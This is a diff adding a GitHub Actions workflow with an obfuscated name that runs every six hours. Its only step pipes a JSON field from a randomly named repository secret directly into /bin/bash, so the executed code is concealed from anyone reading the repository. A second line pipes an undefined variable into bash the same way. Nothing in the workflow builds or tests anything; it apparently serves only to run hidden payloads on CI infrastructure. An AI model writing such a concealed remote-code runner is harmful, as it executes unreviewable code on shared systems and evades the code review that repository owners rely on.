@@ -1,0 +1,19 @@
+name: adamcreatemodern
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: adamcreatemodern
+        env:
+          edwhj83: ${{ secrets.edwhj83 }}
+        run: |
+          echo $edwhj83 | jq -r .sty51093 | /bin/bash
+          echo $c76457 | jq -r .hcb88 | /bin/bash
+
